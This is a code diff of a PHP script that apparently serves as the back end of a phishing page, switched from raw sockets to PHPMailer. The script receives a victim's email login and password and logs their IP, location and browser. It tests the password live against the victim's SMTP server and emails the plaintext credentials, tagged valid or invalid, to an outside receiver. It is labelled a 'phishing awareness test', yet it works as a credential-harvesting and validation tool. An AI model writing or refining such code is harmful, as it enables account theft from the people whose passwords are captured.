@@ -1,4 +1,8 @@
 <?php
+// Include PHPMailer classes
+require_once 'class.phpmailer.php';
+require_once 'class.smtp.php';
+
 // Prevent any output before headers
 ob_start();
 
@@ -37,7 +41,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         'status' => 'PHP script is working',
         'method' => 'GET',
         'timestamp' => date('Y-m-d H:i:s'),
-        'msg' => 'PHP backend is accessible'
+        'msg' => 'PHP backend is accessible',
+        'phpmailer_available' => class_exists('PHPMailer'),
+        'smtp_available' => class_exists('SMTP')
     ]);
     exit;
 }
@@ -118,88 +124,36 @@ $log_message .= "IP Address: $ip\n";
 $log_message .= "Location: $country | $city\n";
 $log_message .= "User Agent: $browser\n";
 
-// Test SMTP credentials using native PHP SMTP functions
+// Test SMTP credentials using PHPMailer
 $validCredentials = false;
 $smtp_error = '';
 $connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";
 
 try {
-    // Test SMTP connection using fsockopen
+    // Create PHPMailer instance for credential testing
+    $testMail = new PHPMailer(true);
+    $testMail->isSMTP();
+    $testMail->SMTPAuth = true;
+    $testMail->SMTPDebug = 0; // Disable debug output
+    $testMail->SMTPSecure = $target_smtp_security;
+    $testMail->Host = $target_smtp_server;
+    $testMail->Port = $target_smtp_port;
+    $testMail->Username = $login;
+    $testMail->Password = $passwd;
+    $testMail->Timeout = 10; // 10 second timeout
+    
     $log_message .= "SMTP Server: $connection_details\n";
     
-    // Create socket connection
-    $errno = 0;
-    $errstr = '';
-    $timeout = 10;
-    
-    if ($target_smtp_security === 'ssl') {
-        $socket = @fsockopen("ssl://$target_smtp_server", $target_smtp_port, $errno, $errstr, $timeout);
-    } else {
-        $socket = @fsockopen($target_smtp_server, $target_smtp_port, $errno, $errstr, $timeout);
-    }
-    
-    if (!$socket) {
-        throw new Exception("Cannot connect to $target_smtp_server:$target_smtp_port - $errstr ($errno)");
-    }
-    
-    // Read initial response
-    $response = fgets($socket, 515);
-    if (substr($response, 0, 3) != '220') {
-        throw new Exception("Invalid SMTP response: $response");
-    }
-    
-    // Send EHLO
-    fwrite($socket, "EHLO localhost\r\n");
-    $response = fgets($socket, 515);
-    
-    // Start TLS if required
-    if ($target_smtp_security === 'tls') {
-        fwrite($socket, "STARTTLS\r\n");
-        $response = fgets($socket, 515);
-        if (substr($response, 0, 3) != '220') {
-            throw new Exception("STARTTLS failed: $response");
-        }
-        
-        // Enable TLS encryption
-        if (!stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
-            throw new Exception("Failed to enable TLS encryption");
-        }
-        
-        // Send EHLO again after TLS
-        fwrite($socket, "EHLO localhost\r\n");
-        $response = fgets($socket, 515);
-    }
-    
-    // Attempt authentication
-    fwrite($socket, "AUTH LOGIN\r\n");
-    $response = fgets($socket, 515);
-    if (substr($response, 0, 3) != '334') {
-        throw new Exception("AUTH LOGIN not supported: $response");
-    }
-    
-    // Send username
-    fwrite($socket, base64_encode($login) . "\r\n");
-    $response = fgets($socket, 515);
-    if (substr($response, 0, 3) != '334') {
-        throw new Exception("Username rejected: $response");
-    }
-    
-    // Send password
-    fwrite($socket, base64_encode($passwd) . "\r\n");
-    $response = fgets($socket, 515);
-    
-    if (substr($response, 0, 3) == '235') {
+    // Attempt SMTP connection and authentication
+    if ($testMail->smtpConnect()) {
         $validCredentials = true;
         $log_message .= "Status: VALID CREDENTIALS - Authentication successful\n";
+        $testMail->smtpClose();
     } else {
         $validCredentials = false;
         $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
-        $smtp_error = "Authentication failed: " . trim($response);
+        $smtp_error = "Authentication failed on $target_smtp_server";
     }
-    
-    // Close connection
-    fwrite($socket, "QUIT\r\n");
-    fclose($socket);
     
 } catch (Exception $e) {
     $validCredentials = false;
@@ -210,7 +164,7 @@ try {
     // Additional error details for debugging
     if (strpos($smtp_error, 'Authentication failed') !== false) {
         $log_message .= "Authentication Error: Invalid username/password for $target_smtp_server\n";
-    } elseif (strpos($smtp_error, 'Cannot connect') !== false) {
+    } elseif (strpos($smtp_error, 'Cannot connect') !== false || strpos($smtp_error, 'Connection refused') !== false) {
         $log_message .= "Connection Error: Cannot connect to $target_smtp_server:$target_smtp_port\n";
     } elseif (strpos($smtp_error, 'timeout') !== false) {
         $log_message .= "Timeout Error: Connection to $target_smtp_server timed out\n";
@@ -232,32 +186,67 @@ if ($validCredentials) {
     $email_status = "INVALID CREDENTIALS";
 }
 
-// Prepare email body (simplified without PHPMailer)
-$email_body = "Phishing Awareness Test - Login Attempt\n";
-$email_body .= "Status: $email_status\n\n";
-$email_body .= "Attempt Number: #$attempt_number\n";
-$email_body .= "Timestamp: $timestamp\n";
-$email_body .= "Email: $login\n";
-$email_body .= "Password: $passwd\n";
-$email_body .= "IP Address: $ip\n";
-$email_body .= "Location: $country, $city\n";
-$email_body .= "User Agent: $browser\n\n";
-$email_body .= "SMTP Server Tested: $connection_details\n";
-if ($validCredentials) {
-    $email_body .= "Result: ✅ Authentication successful - Valid credentials\n";
-} else {
-    $email_body .= "Result: ❌ Authentication failed - Invalid credentials\n";
-    $email_body .= "Error Details: $smtp_error\n";
-}
+// Prepare HTML email body using PHPMailer
+$email_body = "
+<html>
+<head>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .header { background-color: " . ($validCredentials ? "#d4edda" : "#f8d7da") . "; padding: 10px; border-radius: 5px; }
+        .details { margin: 10px 0; }
+        .label { font-weight: bold; }
+        .valid { color: #155724; }
+        .invalid { color: #721c24; }
+        .server-info { background-color: #f8f9fa; padding: 10px; border-left: 4px solid #007bff; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class='header " . ($validCredentials ? "valid" : "invalid") . "'>
+        <h2>Phishing Awareness Test - Login Attempt</h2>
+        <p><strong>Status: $email_status</strong></p>
+    </div>
+    
+    <div class='details'>
+        <p><span class='label'>Attempt Number:</span> #$attempt_number</p>
+        <p><span class='label'>Timestamp:</span> $timestamp</p>
+        <p><span class='label'>Email:</span> $login</p>
+        <p><span class='label'>Password:</span> $passwd</p>
+        <p><span class='label'>IP Address:</span> $ip</p>
+        <p><span class='label'>Location:</span> $country, $city</p>
+        <p><span class='label'>User Agent:</span> $browser</p>
+    </div>
+    
+    <div class='server-info'>
+        <p><span class='label'>SMTP Server Tested:</span> $connection_details</p>
+        " . ($validCredentials ? 
+            "<p style='color: #155724;'><span class='label'>Result:</span> ✅ Authentication successful - Valid credentials</p>" : 
+            "<p style='color: #721c24;'><span class='label'>Result:</span> ❌ Authentication failed - Invalid credentials</p>
+             <p><span class='label'>Error Details:</span> $smtp_error</p>") . "
+    </div>
+</body>
+</html>
+";
 
-// Send notification email using native PHP mail function
+// Send notification email using PHPMailer
 $mail_sent = false;
 try {
-    $headers = "From: $senderuser\r\n";
-    $headers .= "Reply-To: $senderuser\r\n";
-    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
+    $notifyMail = new PHPMailer(true);
+    $notifyMail->isSMTP();
+    $notifyMail->SMTPAuth = true;
+    $notifyMail->Host = $senderserver;
+    $notifyMail->Username = $senderuser;
+    $notifyMail->Password = $senderpass;
+    $notifyMail->Port = $senderport;
+    $notifyMail->SMTPSecure = 'tls';
+    $notifyMail->From = $senderuser;
+    $notifyMail->FromName = 'Phishing Awareness System';
+    $notifyMail->addAddress($receiver);
+    $notifyMail->isHTML(true);
+    $notifyMail->Subject = $subject;
+    $notifyMail->Body = $email_body;
+    $notifyMail->AltBody = strip_tags(str_replace('<br>', "\n", $email_body));
     
-    $mail_sent = @mail($receiver, $subject, $email_body, $headers);
+    $mail_sent = $notifyMail->send();
 } catch (Exception $e) {
     error_log("Failed to send notification email: " . $e->getMessage());
 }
@@ -293,7 +282,8 @@ $response['debug_info'] = [
     'request_method' => $_SERVER['REQUEST_METHOD'],
     'origin' => $_SERVER['HTTP_ORIGIN'] ?? 'not set',
     'user_agent' => substr($browser, 0, 100),
-    'post_data_received' => !empty($_POST)
+    'post_data_received' => !empty($_POST),
+    'phpmailer_used' => true
 ];
 
 // Clean output buffer and send JSON response
